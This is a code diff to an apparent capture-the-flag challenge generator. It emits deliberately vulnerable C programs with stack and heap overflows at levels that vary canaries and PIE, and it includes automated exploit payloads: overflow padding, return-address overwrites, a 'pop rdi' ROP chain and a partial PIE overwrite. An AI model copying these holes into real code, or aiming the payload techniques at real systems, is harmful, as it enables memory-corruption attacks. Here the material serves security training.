@@ -24,20 +24,19 @@ challenge_header = r"""
 #include <fcntl.h>
 
 void win(int);
-int vuln();
+int vuln(int, char**, char**);
 
-int asdf(int fdsa)
+int asdf()
 {
     __asm__ __volatile__ (
         ".intel_syntax noprefix;"
 		"push rdi;"
 		"pop rdi;"
-		"leave;"
 		"ret;"
         ".att_syntax;"
 		:
 		:
-		: "%rdi"
+		:
 	);
 	exit(0);
 }
@@ -48,6 +47,13 @@ int main(int argc, char **argv, char **envp)
 	printf("\tWelcome to %s!\n", argv[0]);
 	puts("===================================================");
 	setvbuf(stdin, NULL, _IONBF, 0);
+	setvbuf(stdin, NULL, _IONBF, 1);
+
+	return vuln(argc, argv, envp);
+}
+
+int vuln(int argc, char **argv, char **envp)
+{
 
 """
 challenge_footer = """
@@ -87,27 +93,27 @@ def escape_string(s):
 
 levels = [
 	# level 0: not PIE, overflow into two variables at different offsets to satisfy a condition to win
-	lambda r: Challenge(local_win=True, canary=True),
+	lambda r: Challenge(local_win=True, canary=True, random_seed=r),
 	# level 1: add a signed size check
-	lambda r: Challenge(local_win=True, size_check=True, signed_size=True, canary=True),
+	lambda r: Challenge(local_win=True, size_check=True, signed_size=True, canary=True, random_seed=r),
 	# level 2: remove the condition (overflow to win function)
-	lambda r: Challenge(size_check=True, signed_size=True),
+	lambda r: Challenge(size_check=True, signed_size=True, random_seed=r),
 	# level 6: win function takes an argument, another function pops rdi
-	lambda r: Challenge(size_check=True, signed_size=True, picky_win=True),
+	lambda r: Challenge(size_check=True, signed_size=True, picky_win=True, random_seed=r),
 	# level 3: make the binary PIE (no leak!)
-	lambda r: Challenge(pie=True),
+	lambda r: Challenge(pie=True, random_seed=r),
 	# level 4: add a constant canary (no leak)
-	lambda r: Challenge(pie=True, canary=True, override_canary=True),
+	lambda r: Challenge(pie=True, canary=True, override_canary=True, random_seed=r),
 	# level 5: add a variable canary (jump it)
-	lambda r: Challenge(pie=True, canary=True, incremental_read=True),
+	lambda r: Challenge(pie=True, canary=True, incremental_read=True, random_seed=r),
 	# level 5: canary and everything, but flag in env
-	lambda r: Challenge(pie=True, canary=True, env_flag=True),
+	lambda r: Challenge(pie=True, canary=True, env_flag=True, random_seed=r),
 	# level 6: PIE, win function takes an argument, another function pops rdi
-	lambda r: Challenge(echo_input=True, input_twice=True, picky_win=True, pie=True, canary=False),
+	lambda r: Challenge(echo_input=True, input_twice=True, picky_win=True, pie=True, canary=False, random_seed=r),
 	# level 7: no canary bypass, argv corruption to leak data with abort()
-	lambda r: Challenge(canary=True, env_flag=True, pie=True),
+	lambda r: Challenge(canary=True, env_flag=True, pie=True, random_seed=r),
 	# level 8: heap overflow
-	lambda r: Challenge(on_heap=True, local_win=True, pie=True),
+	lambda r: Challenge(on_heap=True, local_win=True, pie=True, random_seed=r),
 ]
 
 class Challenge(object):
@@ -127,6 +133,7 @@ class Challenge(object):
 		self._env_flag = env_flag
 		self._on_heap = on_heap
 		self._incremental_read = incremental_read
+		self._chal_path = None
 
 		self._buffer_size = self._random.randrange(8, 1016, 16)
 		self._some_offsets = [ self._random.randrange(1, 4) for _ in range(8) ]
@@ -137,24 +144,46 @@ class Challenge(object):
 	random_seed=%d
 )""" % (self._random_seed)
 
-	def test(self, chal_name, right=None):
+	def _process(self):
+		cmd = [ self._chal_path ]
+		p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env={})
+		return p
+
+	def _find_crashing_prefix(self, known=""):
+		# first, find the next crashword
+		payload = known
+		while True:
+			next_char = os.urandom(1)
+			for _ in range(2):
+				process = self._process()
+				process.communicate(payload+next_char)
+				process.wait()
+				if process.returncode != 0:
+					break
+			else:
+				payload += "A"
+			break
+
+		print "First crash after %d chars" % len(payload)
+
+	def test(self, right=None):
+		chal_name = self._chal_path
 		if right is None:
-			assert any(self.test(chal_name, right=True) for _ in range(256))
-			assert all(self.test(chal_name, right=False) for _ in range(4))
+			assert all(self.test(right=False) for _ in range(1))
+			assert any(self.test(right=True) for _ in range(16))
 			return True
 
 		print "Testing %r right=%s" % (self, right)
 
-		shutil.rmtree("/tmp/test")
-		os.makedirs('/tmp/test')
-		self.compile('/tmp/test/%s' % chal_name)
+		#shutil.rmtree("/tmp/test")
+		#os.makedirs('/tmp/test')
+		#self.compile(chal_name)
 
 		print "Launching process!"
-		cmd = [ '/tmp/test/%s' % chal_name ]
-		p = subprocess.Popen(cmd, cwd='/tmp/test', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env={})
+		p = self._process()
 
 		if right:
-			payload = self._get_payload('/tmp/test/%s'%chal_name)
+			payload = self._get_payload(chal_name)
 		else:
 			payload = "nope"
 		print "Communicating!"
@@ -178,25 +207,30 @@ class Challenge(object):
 		win_addr = next(int(s.split()[0], 16) for s in subprocess.Popen(["nm", path], stdout=subprocess.PIPE).communicate()[0].split('\n') if 'win' in s)
 		asdf_addr = next(int(s.split()[0], 16) for s in subprocess.Popen(["nm", path], stdout=subprocess.PIPE).communicate()[0].split('\n') if 'asdf' in s)
 
-		if not self._on_heap and self._local_win:
+		if not self._pie and not self._on_heap and self._local_win:
 			p += "A"*(self._buffer_size+8) + "".join("B"*p + chr(b) for p,b in zip(self._some_offsets, self._some_bytes))
-		elif not self._local_win and not self._on_heap and not self._canary and not self._picky_win:
+		elif not self._pie and not self._local_win and not self._on_heap and not self._canary and not self._picky_win:
 			p += struct.pack("<Q", win_addr) * 1024
-		elif not self._local_win and not self._on_heap and not self._canary:
-			p += "A"*8 + (struct.pack("<Q", asdf_addr+12) + struct.pack("<Q", win_addr)) * 512
+		elif not self._pie and not self._local_win and not self._on_heap and not self._canary:
+			p += ("A"*8)*random.randint(0,3) + (struct.pack("<Q", asdf_addr+5) + struct.pack("<Q", 0x1337) + struct.pack("<Q", win_addr)) * 128
+		elif self._pie and not self._canary and not self._on_heap and not self._local_win:
+			of = "A"*(self._buffer_size+8) + struct.pack("<Q", win_addr)[:2]
+			print hex(self._buffer_size), hex(len(of))
+			p += of
 
 		return p
 
 	def compile(self, filename):
 		with open(filename+'.c', 'w') as o:
 			o.write(self.emit())
-		gcc_options = ""
+		gcc_options = "-fomit-frame-pointer "
 		if not self._pie:
 			gcc_options += "-no-pie "
 		if not self._canary:
 			gcc_options += "-fno-stack-protector "
 
 		assert os.system('gcc -O0 %s -Wno-incompatible-pointer-types -Wno-unused-result %s.c -o %s' % (gcc_options, filename, filename)) == 0
+		self._chal_path = filename
 
 	def emit(self):
 		code = challenge_header
@@ -274,7 +308,7 @@ void win(int win_token)
 			code += "\tassert(win_token == 0x1337);"
 		code += """
 	puts("You win! Here is your flag:");
-	int flag_fd = open("/flag", 0);
+	register int flag_fd = open("/flag", 0);
 	sendfile(1, flag_fd, 0, 1024);
 }
 """
@@ -292,6 +326,7 @@ def create(dirname):
 	# 2 per type per level
 	#for _u in tqdm.tqdm(range(200)):
 	for _u in [ 0 ]:
+		#for _d,_l in list(enumerate(levels))[3:]:
 		for _d,_l in enumerate(levels):
 			_s_start = 100000*_u + 1000*_d
 			_s_end = _s_start + 3
@@ -302,7 +337,7 @@ def create(dirname):
 				print _u,_d,_chal_name,_s
 				c = _l(_s)
 				c.compile(os.path.join(dirname, str(_u), _chal_name))
-				c.test(_chal_name)
+				c.test()
 
 if __name__ == '__main__':
 	create('challenges')
